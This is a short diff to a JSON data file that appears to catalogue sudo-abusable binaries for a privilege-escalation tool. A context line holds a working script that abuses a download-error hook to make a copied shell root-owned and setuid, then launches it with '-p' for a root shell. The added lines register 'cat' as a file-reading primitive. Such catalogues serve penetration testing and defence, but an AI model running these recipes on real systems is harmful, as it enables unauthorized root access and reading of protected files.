@@ -34,5 +34,9 @@
 			"script": "TF=$(mktemp); SHELL=$(mktemp); cp {shell} $SHELL; echo \"chown root:root $SHELL; chmod +sx $SHELL;\" > $TF;chmod +x $TF; {command}; sleep 1; $SHELL -p",
 			"need": ["--on-download-error=$TF","http://x"]
 		}
+	},
+	{
+		"name": "cat",
+		"read_file": "{path} {lfile}"
 	}
 ]
